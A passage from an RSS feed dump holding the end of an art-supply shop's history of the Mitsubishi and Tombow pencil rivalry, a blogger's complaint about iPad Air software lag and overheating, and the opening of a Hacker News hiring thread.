srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/kh20-sharpener-beauty.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/kh20-sharpener-beauty.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/kh20-sharpener-beauty.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/kh20-sharpener-beauty.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A </span><a href="https://shop.stlartsupply.com/products/kh-20-desktop-pencil-sharpener?ref=notes.stlartsupply.com"><span>Mitsubishi KH-20 crank sharpener</span></a><span> with a </span><a href="https://shop.stlartsupply.com/products/uni-star-pencil-hb-set-of-12?ref=notes.stlartsupply.com"><span>Mitsubishi Uni Star HB</span></a><span>. Uni Star is a budget version of Uni with the same core but a less refined finish.</span></figcaption></figure><p>It was clear soon after Uni's 1958 launch that the pencil was a success. The maroon, gold, and black pencil was an instant status symbol and a genuine object of desire for students. From a technical perspective, Uni remains one of the best pencils ever made, surpassing European and domestic rivals with its ultra-smooth, impressively dark graphite.</p><p>Akioka's futuristic design influenced the rest of the industry, and Uni pencils have been a fixture in Japanese schools and offices ever since. The company continues to manufacture them, almost exactly as they were 64 years ago.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-2.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/more-vintage-pencils-mar-2022-2.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/more-vintage-pencils-mar-2022-2.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/more-vintage-pencils-mar-2022-2.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-2.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A vintage Tombow MONO COPY 2H pencil. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><h3 id="eight-billion-particles-per-cubic-millimeter">Eight Billion Particles Per Cubic Millimeter</h3><p>At Tombow, Hachiro Ogawa had become the company's president following Harunosuke's death in 1957. Hachiro and his younger brother Kohei worked to broaden Tombow's product line, launching their first mechanical pencils in 1957, markers and ballpoint pens in 1958, and an electric sharpener in 1962. But even as Tombow and Mitsubishi expanded their offerings into new kinds of writing tools, the pencil rivalry was not quite over.</p><p>In 1963, Tombow replaced its decade-old HOMO pencils with the newly renamed and completely redesigned MONO brand. The new name (created upon Tombow's belated discovery of the English meaning of "homo") was suggested by Tombow technical consultant Akamatsu Noriyasu, who had been a primary author of the University of Tokyo pencil core research. MONO comes from the Greek <em>monos</em>, which Tombow translates as "unique and unrivaled."</p><p>With a new, glossier design in black, gold, and white, plus advertisements touting "8 billion particles per cubic millimeter" and a prestigious pricetag of 60 yen (20% higher than Uni), Tombow MONO was a direct response to Mitsubishi's groundbreaking design. The dynamic of the rivalry had changed again after a half-century of competition. Now Mitsubishi had the initiative, and Tombow had to match its rival's advances. </p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/70th-anniversary-diamond-memo-70th-beauty.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/70th-anniversary-diamond-memo-70th-beauty.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/70th-anniversary-diamond-memo-70th-beauty.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/70th-anniversary-diamond-memo-70th-beauty.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/70th-anniversary-diamond-memo-70th-beauty.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A vintage Mitsubishi 3900 H pencil, pictured with some anachronistic accessories. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><h3 id="the-new-chairmen">The New Chairmen</h3><p>In April 1963, four months before the release of MONO, tragedy struck Tombow's Ogawa family when Hachiro died suddenly. Kohei, the younger brother, was appointed Hachiro's successor only six years after Hachiro replaced Harunosuke. Towa Ogawa, Harunosuke's wife and collaborator, known for her early embrace of the mass media, would live only one year longer than her oldest son. She died in 1964 and was one of very few women to be awarded Japan's Order of the Sacred Treasure that same year.</p><p>Understandably, the launch of MONO was a moment of mixed emotions at Tombow. Hachiro's latest leap forward was a success, and the MONO brand became just as important to Tombow as the Uni brand is to Mitsubishi. But the innovative older brother wasn't there to see the outsized results of his short six years at the helm.</p><p>In large part because of Hachiro's modernization efforts in the forties and fifties, MONO pencils are still used by artists and writers, and MONO brand stationery in virtually every category is a familiar sight in shops around the world. Hachiro's vision in creating HOMO laid the foundation for Tombow's next 50 years.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-5.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/more-vintage-pencils-mar-2022-5.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/more-vintage-pencils-mar-2022-5.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/more-vintage-pencils-mar-2022-5.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-5.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Vintage Mitsubishi 1321 H pencil with pink lacquer and black squiggles. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><p>Mitsubishi was also undergoing a generational shift. Chairman Saburo Suhara retired in 1960, and his son Yoji, champion of the Uni project, became the company's new leader. After MONO's release in 1963, Suhara and Mitsubishi understood they would have to respond. Pencil production and demand had continued to grow, as had the number of pencil manufacturers in Japan. In 1960, there were more than 200 of them.</p><p>But creating a pencil even more luxurious than Uni would not necessarily have a big impact on the company's performance—a pencil <em>that </em>refined would certainly be a niche item, not sent in schoolchildrens' backpacks like Uni. Further, the writing (if you'll forgive the bad joke) was on the wall for pencils as a universally important, in-demand item.</p><p>Pens and mechanical pencils had supplanted wooden pencils, which no longer seemed so convenient in comparison with a ballpoint. Mitsubishi, in fact, had already started making pens in 1959 and mechanical pencils in 1961. Following Pentel's commercialization of fiber-tipped pens in 1963, Mitsubishi introduced its own porous point pens in 1965.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-and-tombow-vintage-pencils-1.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/mitsubishi-and-tombow-vintage-pencils-1.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/mitsubishi-and-tombow-vintage-pencils-1.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/mitsubishi-and-tombow-vintage-pencils-1.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-and-tombow-vintage-pencils-1.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Golden Age pencils from Mitsubishi and Tombow. From front to back: Uni Popular HB, Tombow 9561 2H, Tombow HOMO 4H. (</span><i><em>St. Louis Art Supply archives)</em></i></figcaption></figure><p>So, although Mitsubishi and Tombow didn't know in advance that the Japanese pencil industry would reach its peak in 1966, both companies clearly saw it coming, and they had already prepared themselves for a future beyond pencils. One wonders why both companies continued to expend research and development resources on high-end pencils in the late 1960s, but they did—and on a personal note, this sometimes inexplicable tendency of Japanese manufacturers to perfect what doesn't need to be perfected is a major reason why we're so passionate about our Japanese imports.</p><p>Faced with a coming drop in demand and with successful, high-quality products already on the market, many Western companies would have started cutting costs, not investing in further improvements. Indeed, the truly innovative days of German and American pencil manufacturing were already over. But thanks to the competitive, perfectionist leaders and designers at Mitsubishi and Tombow, the late 1960s yielded two more historic pencils.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/hi-uni-ad-from-japanese-handball-journal-2.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/hi-uni-ad-from-japanese-handball-journal-2.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/hi-uni-ad-from-japanese-handball-journal-2.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/hi-uni-ad-from-japanese-handball-journal-2.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/hi-uni-ad-from-japanese-handball-journal-2.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A </span><a href="https://shop.stlartsupply.com/collections/pencils/products/hi-uni-pencil-hb-set-of-12?ref=notes.stlartsupply.com"><span>Mitsubishi Hi-Uni</span></a><span> print advertisement from 1970. The copy emphasizes Hi-Uni's dark, soft lead. </span><i><em>(Journal of the Japanese Handball Association, issue 74)</em></i></figcaption></figure><h3 id="the-last-premium-pencils">The Last Premium Pencils</h3><p>In 1966, precisely at the peak of the Japanese pencil industry, Yoji Suhara's Mitsubishi introduced <a href="https://shop.stlartsupply.com/collections/pencils/products/hi-uni-pencil-hb-set-of-12?ref=notes.stlartsupply.com">Hi-Uni</a>, an upgraded version of Yoshio Akioka's eight-year-old Uni. We all know that sequels (especially those released after the commercial peak of the franchise) tend to be disappointing, but Hi-Uni is the rare exception. Rather than overcomplicating or underappreciating Akioka's design, Mitsubishi improved on it in every way without diminishing its modern style.</p><p>Hi-Uni came in a wider range of grades, resolving a key shortcoming of the original model. (The<a href="https://shop.stlartsupply.com/collections/pencils/products/hi-uni-pencil-hb-set-of-12?ref=notes.stlartsupply.com"> current Hi-Uni</a> is offered in an amazing 22 grades, with 10B added to the lineup just recently.) The core boasted Mitsubishi's latest technical innovation, which went beyond simply minimizing particle size to actually <em>maximizing particle density</em> by combining particles of different sizes in a precise ratio. And no expense was spared in sourcing and screening the raw materials for this very precious pencil.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/hi-uni-on-canvas-1.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/hi-uni-on-canvas-1.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/hi-uni-on-canvas-1.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/hi-uni-on-canvas-1.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/hi-uni-on-canvas-1.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A contemporary </span><a href="https://shop.stlartsupply.com/collections/pencils/products/hi-uni-pencil-hb-set-of-12?ref=notes.stlartsupply.com"><span>Mitsubishi Hi-Uni</span></a><span>. The only differences between this and the 1966 Hi-Uni are the gold dot on the endcap (it used to be white) and the removal of the JIS mark in 1998.</span></figcaption></figure><p>The result (and here, I'll reveal a strongly held personal belief) is the greatest pencil ever made, in any country, before or since. For Mitsubishi's designers, the ideal pencil would have "6B blackness with 9H hardness," able to make very dark marks while also wearing down slowly and offering pinpoint precision. Hi-Uni's core, with its innovative mixture of particle sizes, comes pretty close to this unachievable ideal. Better yet, despite its excellent point retention, Hi-Uni lead is also the industry leader in smoothness.</p><p>Hi-Uni was an authoritative and complete response to Tombow MONO, and it launched with the same legendary status it retains for pencil lovers today. At a princely price of 100 yen each in 1966 (that's almost $4 in today's dollars!), Hi-Uni represented the almost excessive pursuit of perfection in simple things. It spoke to the desire for a rich and comforting everyday life. And it expressed the powerful optimism of 1960s Japan.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/vintage-mono-100-with-case-1.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/vintage-mono-100-with-case-1.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/vintage-mono-100-with-case-1.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/vintage-mono-100-with-case-1.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/vintage-mono-100-with-case-1.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A vintage set of </span><a href="https://shop.stlartsupply.com/products/mono-100-pencil-hb-set-of-12?ref=notes.stlartsupply.com"><span>MONO 100</span></a><span> pencils in their original packaging from the late 1960s. The box is surprisingly heavy, in part because an eraser was included—in its own, smaller case! (</span><i><em>St. Louis Art Supply archives)</em></i></figcaption></figure><p>Tombow wasn't far behind with its own aspirational pencil, and <a href="https://shop.stlartsupply.com/products/mono-100-pencil-hb-set-of-12?ref=notes.stlartsupply.com">MONO 100</a>, the last premium pencil launched by either manufacturer to this day, appeared in stores in 1967. It was perhaps a sign of an emerging détente that MONO 100 debuted at exactly the same retail price as Hi-Uni: 100 yen each.</p><p>Taking a page from Mitsubishi's book, Tombow hired a well-known industrial designer, Takashi Kono, to update the MONO design. Kono had been involved in high-profile projects like the Olympics and the World's Fair and was one of the most accomplished adesigners in midcentury Japan. His design for MONO 100 is a genuine classic, with a cooler, slicker, and simpler look than the soft-edged, stately Mitsubishi Hi-Uni. It's particularly recognizable for its white stripe, jauntily painted in a vertical arc over the endcap.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/tombow-mono-100-beauty-3.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/tombow-mono-100-beauty-3.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/tombow-mono-100-beauty-3.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/tombow-mono-100-beauty-3.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/tombow-mono-100-beauty-3.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A contemporary set of </span><a href="https://shop.stlartsupply.com/products/mono-100-pencil-b-set-of-12?ref=notes.stlartsupply.com"><span>MONO 100 pencils in grade B.</span></a></figcaption></figure><p>From an industrial design standpoint, Tombow stuck to its strategy of milling finer and finer particles. The MONO 100 advertisements claimed "10 billion particles per cubic millimeter," up from 8 billion for the original MONO. This design concept makes MONO 100 different from Hi-Uni in a few important ways. MONO 100 is more precise and longer-wearing than the same grade of Hi-Uni, but somewhat less smooth and dark.</p><p>Those differences make the Hi-Uni / MONO 100 debate a sort of personality test. Do you prefer creamy, super-dark graphite, and are you okay with sharpening more frequently? Would you enjoy using a pencil with a design that connotes luxury, elegance, and composure? Then <a href="https://shop.stlartsupply.com/collections/pencils/products/hi-uni-pencil-hb-set-of-12?ref=notes.stlartsupply.com">Hi-Uni</a> is the pencil for you. But if, instead, you prefer sharper, more defined marks, with less smudging, less sharpening, and a futuristic look, then <a href="https://shop.stlartsupply.com/products/mono-100-pencil-b-set-of-12?ref=notes.stlartsupply.com">MONO 100</a> might be a better choice.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/Mitsubishi_Pencil_HQ_Building_March-2019.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/Mitsubishi_Pencil_HQ_Building_March-2019.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/Mitsubishi_Pencil_HQ_Building_March-2019.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/Mitsubishi_Pencil_HQ_Building_March-2019.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/Mitsubishi_Pencil_HQ_Building_March-2019.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Mitsubishi Pencil's headquarters in 2019. Photo credit: </span><a href="https://commons.wikimedia.org/w/index.php?curid=77372982&amp;ref=notes.stlartsupply.com"><span>Doricono</span></a><span>, </span><a href="https://creativecommons.org/licenses/by-sa/4.0?ref=notes.stlartsupply.com"><span>CC BY-SA 4.0</span></a><span>, via Wikimedia Commons</span></figcaption></figure><h3 id="the-golden-age-never-ended">The Golden Age Never Ended</h3><p>Isn't it strange that this historical essay includes purchase recommendations? That's kind of the beauty of our weird little industry. Most of the pencils discussed in this article are still manufactured and sold, even though there would never be another pencil launch to top Hi-Uni and MONO 100. Mitsubishi and Tombow each expanded and modernized their businesses, and today both are heritage brands with large, diversified product lines.</p><p>For those of us who love pencils—the design and typography, the nostalgia, the irreplaceable sound of smooth graphite on paper—the end of this story is bittersweet. Pencil manufacturing is not really an industry of its own; very few companies today specialize in wood pencils alone, and certainly no large companies do. Pencils have vanished from offices and are used mainly by artists and students. Since the 1970s, many historic European and American brands have actually decreased in quality. Frankly, we have to accept that Hi-Uni and MONO 100 will probably not be improved upon.</p><p>But is that such a bad thing? Maybe Mitsubishi never fired back with a "Hi-Hi-Uni" because pencil manufacturing had reached a natural point of diminishing returns, where any further increase in quality would be virtually imperceptible. Today's manufacturers are not racing to improve the pocket knife, for example, because the technology is mature and the major flaws have been sorted out by past generations. Many of the most revered brands, like France's Opinel, have made the same knives for decades, and they cut just as well as they always have.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-kohitsu-shosha-10b-beauty-3.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/mitsubishi-kohitsu-shosha-10b-beauty-3.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/mitsubishi-kohitsu-shosha-10b-beauty-3.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/mitsubishi-kohitsu-shosha-10b-beauty-3.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-kohitsu-shosha-10b-beauty-3.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A </span><a href="https://shop.stlartsupply.com/collections/pencils/products/kohitsu-shosha-pencil-saitama-edition-10b?ref=notes.stlartsupply.com"><span>Mitsubishi Kohitsu Shosha pencil, Saitama edition</span></a><span>, with hexagonal body and 10B core.</span></figcaption></figure><p>In this pencil merchant's opinion, there's simply no need for a pencil more perfect than the best of Japan's Golden Age. We can admire the heady moment and the strong personalities who created these pencils, and we can be forgiven for daydreaming about the even-more-perfect pencil, the one that would make our handwriting beautiful and our drawings perfectly proportional. </p><p>But when I sit down to sharpen my pencil (usually a Hi-Uni HB or Mitsubishi 9852 "Master Writing" B), my primary feeling is gratitude. The designers and engineers who created these tools didn't know they would be made for 70 years, but they treated their seemingly small task with intense seriousness of purpose, and that passion produced outstanding tools that have still not been surpassed. Today, in 2022, I frequently speak with artists who tell me how much these pencils inspire them and enable their best work.</p><p>So I'm not regretful about the end of the Golden Age of Pencils, because in the ways that matter most, it never ended. <a href="https://shop.stlartsupply.com/collections/mitsubishi-pencil-co?ref=notes.stlartsupply.com">Mitsubishi, in particular, has loyally maintained its midcentury product line,</a> continuing to manufacture its pencils in Japan and even adding a minor new model now and then. (There's an antiviral-coated Mitsubishi in light blue, <a href="https://shop.stlartsupply.com/products/mitsubishi-9800vb-pencil-hb-box-of-12?ref=notes.stlartsupply.com">new for 2022</a>.) Artists and writers still debate the merits of Hi-Uni and MONO 100. </p><p>And I can't speak for everyone who works here, but personally, I'm excited every time I ship a fresh, unsharpened dozen to a new customer. For them, the Golden Age is just getting started.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/md-notebook-light-70th-anniversary-beauty-4.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/md-notebook-light-70th-anniversary-beauty-4.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/md-notebook-light-70th-anniversary-beauty-4.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/md-notebook-light-70th-anniversary-beauty-4.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/md-notebook-light-70th-anniversary-beauty-4.jpg 2000w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="references">References</h3><p>Feenstra, Robert C., Robert Inklaar and Marcel P. Timmer, "The Next Generation of the Penn World Table," <em>American Economic Review</em>, 105(10), 3150-3182, available for download at http://www.ggdc.net/pwt</p><p>Japan Pencil Industry Cooperative Association, "The history of pencils and the Japanese pencil industry," 2001. <a href="http://www.pencil.or.jp/company/rekishi/rekishi.html?ref=notes.stlartsupply.com#01">http://www.pencil.or.jp/company/rekishi/rekishi.html</a></p><p>NTT Comware Co., "Long seller: Mitsubishi Uni pencils," <em>Comzine</em>, volume 23, issue 5 (2005). <a href="https://www.nttcom.co.jp/comzine/no023/long_seller/?ref=notes.stlartsupply.com">https://www.nttcom.co.jp/comzine/no023/long_seller/</a></p><p>Tombow Pencil Co., Ltd., <em>100 Year History of Tombow Pencil</em>, 2013<em>. </em>Free Japanese ebook available <a href="https://my.ebook5.net/tombow/tL6UMg/?ref=notes.stlartsupply.com">here</a>.</p>
    </div>

            </article>                                </main>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple's Software Quality Crisis: When Premium Hardware Meets Subpar Software (213 pts)]]></title>
            <link>https://www.eliseomartelli.it/blog/2025-03-02-apple-quality</link>
            <guid>43243075</guid>
            <pubDate>Mon, 03 Mar 2025 16:04:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eliseomartelli.it/blog/2025-03-02-apple-quality">https://www.eliseomartelli.it/blog/2025-03-02-apple-quality</a>, See on <a href="https://news.ycombinator.com/item?id=43243075">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div><p>Mar 2, 2025<!-- --> - ⏱️ <!-- -->4 minutes to read</p></div><p>As a long-time Apple user, I've always appreciated the seamless integration of
hardware and software that is the signature of the Apple ecosystem. However,
recent experiences with my iPad Air 11" M2 has left me questioning whether
Apple has lost sight of what once made their products exceptional.</p>
<h2>A Brief Timeline</h2>
<ul>
<li><strong>November 6, 2024</strong>: Visited the Apple Store in Turin with my new iPad Air
11" M2 experiencing significant lag and overheating when using Notes and
Freeform with Apple Pencil Pro.</li>
<li><strong>November 13, 2024</strong>: Received a replacement unit after store
representatives suggested a hardware swap.</li>
<li><strong>February 27, 2025</strong>: The replacement unit is now exhibiting identical
performance issues.</li>
</ul>
<h2>Premium Hardware, Struggling Software</h2>
<p>In November, I visited the Apple Store in Turin to address persistent issues
with my iPad Air 11" M2 running iPadOS 18.1. Despite having cutting-edge
hardware, I've been experiencing significant lag when using basic Apple
applications like Notes and Freeform.</p>
<p>The performance issues don't stop at sluggish response times. During these
standard use cases, my iPad frequently overheated, making it uncomfortable to
hold and raising concerns about potential long-term hardware damage.</p>
<p>What made this particularly frustrating is that these aren't third-party
applications pushing the hardware to its limits. These are Apple's own
applications that should theoretically be optimized for their hardware.</p>
<p>The Apple Store staff were courteous and professional, following their standard
troubleshooting protocols. After demonstrating the issues in person, the
support representative suggested a hardware replacement. However, after further
discussion, we both concluded this was likely a software problem rather than a
hardware defect.</p>
<p>I think this highlights a growing challenge for Apple's retail support model:
how do you troubleshoot software issues when the traditional solution has been
to replace hardware? When software quality declines, the entire support
infrastructure feels misaligned.</p>
<p>This experience feels symptomatic of a broader decline in Apple's software
quality.</p>
<p>My replacement iPad Air 11" M2 with the Apple Pencil Pro is once again
struggling with basic tasks. Despite multiple iPadOS updates since my original
complaint (we're now on 18.3.1), the fundamental issues remain:</p>
<ul>
<li><strong>Significant lag when using Apple's own Notes and Freeform applications</strong>:
Input latency increases dramatically after about 5-10 minutes of use, with
stroke rendering delayed by up to 5 seconds.</li>
<li><strong>Device overheating during standard usage scenarios</strong>: CPU temperatures
reach concerning levels (based on device heat) during basic pencil input tasks</li>
<li><strong>Poor responsiveness with the Apple Pencil Pro</strong>: Palm rejection fails
intermittently, and pressure sensitivity becomes inconsistent</li>
</ul>
<p>This recurrence with a replacement device confirms what I suspected last
November - this is a software optimization problem, not a hardware defect.</p>
<h2>Details Worth Noting</h2>
<ul>
<li><strong>Thermal Management Failures</strong>: The M2 chip should throttle performance
before reaching uncomfortable external temperatures, suggesting the thermal
management system isn't properly engaging;</li>
<li><strong>Memory Management Problems</strong>: The gradual degradation in performance points
to memory leaks or improper garbage collection in Apple's drawing applications.</li>
</ul>
<p>Since my original complaint, I've discovered
<a href="https://www.reddit.com/r/iPadOS/search/?q=overheating">numerous</a> forum threads
and social media discussions from iPad users experiencing similar issues. This
suggests a systemic problem rather than isolated incidents.</p>
<p>Most concerning is that multiple software updates have failed to address these
fundamental performance issues while introducing new features that add more
strain to the system (like Apple Intelligence, but that's a story for another
day).</p>
<h2>Reconsidering the "Apple Tax"</h2>
<p>For years, many of us have willingly paid the "Apple tax", the premium price
for Apple products justified by superior user experience, design, and ecosystem
integration. But if software quality continues to decline, this value
proposition becomes increasingly difficult to defend.</p>
<p>The persistence of these issues through multiple software updates suggests:</p>
<ol>
<li><strong>Feature prioritization over optimization</strong>: Engineering resources appear
focused on new capabilities rather than fixing existing performance problems;</li>
<li><strong>Inadequate performance testing</strong>: Real-world usage scenarios with Apple's
own applications aren't being adequately tested.</li>
</ol>
<p>As customers paying premium prices for Apple products, we at least deserve:</p>
<ol>
<li><strong>Transparency</strong>: Acknowledgment of known performance issues;</li>
<li><strong>Focus on fundamentals</strong>: Updates focused solely on performance and
stability;</li>
<li><strong>Extended support</strong>: Consideration for extended warranties when software
issues impact hardware lifespan.</li>
</ol>
<p>The Apple experience was once defined by the joy of using products that "just
worked." Today, that promise feels increasingly hollow as software struggles to
keep pace with hardware capabilities. As users and customers, we need to
vocally advocate for the quality-focused Apple we once knew.</p>
<p>After months of hoping for improvement, I'm faced with difficult decisions
about my future in the Apple ecosystem. This extended iPad issue has severely
damaged my confidence in new Apple products.</p>
<p>I call on Apple to return to its roots - creating products that prioritize user
experience over feature checklists. The company that once proudly created
products that "just work" needs to reclaim that ethos.</p></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Who is hiring? (March 2025) (194 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=43243024</link>
            <guid>43243024</guid>
            <pubDate>Mon, 03 Mar 2025 16:01:41 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=43243024">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="43243024">
      <td><span></span></td>      <td><center><a id="up_43243024" href="https://news.ycombinator.com/vote?id=43243024&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=43243024">Ask HN: Who is hiring? (March 2025)</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_43243024">115 points</span> by <a href="https://news.ycombinator.com/user?id=whoishiring">whoishiring</a> <span title="2025-03-03T16:01:41 1741017701"><a href="https://news.ycombinator.com/item?id=43243024">2 hours ago</a></span> <span id="unv_43243024"></span> | <a href="https://news.ycombinator.com/hide?id=43243024&amp;goto=item%3Fid%3D43243024">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Who%20is%20hiring%3F%20%28March%202025%29&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=43243024&amp;auth=c7877bb21a404c29ba44a26682e7af480dabceb7">favorite</a> | <a href="https://news.ycombinator.com/item?id=43243024">87&nbsp;comments</a>        </span>
              </td></tr>
    <tr><td></td></tr><tr><td colspan="2"></td><td><div><p>Please state the location and include REMOTE for remote work, REMOTE (US)
or similar if the country is restricted, and ONSITE when remote work is <i>not</i> an option.</p><p>Please only post if you personally are part of the hiring company—no
recruiting firms or job boards. One post per company. If it isn't a household name,
explain what your company does.</p><p>Please only post if you are actively filling a position and are committed
to responding to applicants.</p><p>Commenters: please don't reply to job posts to complain about
something. It's off topic here.</p><p>Readers: please only email if you are personally interested in the job.</p><p>Searchers: try <a href="http://nchelluri.github.io/hnjobs/" rel="nofollow">http://nchelluri.github.io/hnjobs/</a>, <a href="https://hnresumetojobs.com/" rel="nofollow">https://hnresumetojobs.com</a>,
<a href="https://hnhired.fly.dev/" rel="nofollow">https://hnhired.fly.dev</a>, <a href="https://kennytilton.github.io/whoishiring/" rel="nofollow">https://kennytilton.github.io/whoishiring/</a>,
<a href="https://hnjobs.emilburzo.com/" rel="nofollow">https://hnjobs.emilburzo.com</a>, or this (unofficial) Chrome extension:
<a href="https://chromewebstore.google.com/detail/hn-hiring-pro/mpfaljjblphnlloddaplgicpkinikjlp" rel="nofollow">https://chromewebstore.google.com/detail/hn-hiring-pro/mpfal...</a>.</p><p>Don't miss these other fine threads:</p><p><i>Who wants to be hired?</i> <a href="https://news.ycombinator.com/item?id=43243022">https://news.ycombinator.com/item?id=43243022</a></p><p><i>Freelancer? Seeking freelancer?</i> <a href="https://news.ycombinator.com/item?id=43243023">https://news.ycombinator.com/item?id=43243023</a></p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table><table>
            <tbody><tr id="43245010"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43245010" href="https://news.ycombinator.com/vote?id=43245010&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Depot | Founding Developer Marketer | Remote (US / EU) | Full-time</p><p>Depot is a build acceleration platform that makes Docker builds and GitHub Actions faster. We've already helped companies like PostHog, Wistia, Semgrep, and Secoda save thousands of hours in build time every week.</p><p>We're looking for our first marketing hire to define and execute our go-to-market strategy. If that's you, you'll own everything from content creation to demand gen, with a focus on developer audiences. We're growing rapidly with 500+ paying customers and double-digit monthly growth.</p><p>Requirements:</p><p>* 5+ years marketing experience with a focus on developer audiences</p><p>* Experience with content marketing, SEO, social, and email campaigns</p><p>* Comfortable with analytics tools (Google Analytics, ahrefs, PostHog)</p><p>* Experience with paid channels (LinkedIn, Reddit, etc.)</p><p>* Strong communication skills and ability to work asynchronously</p><p>Apply here: <a 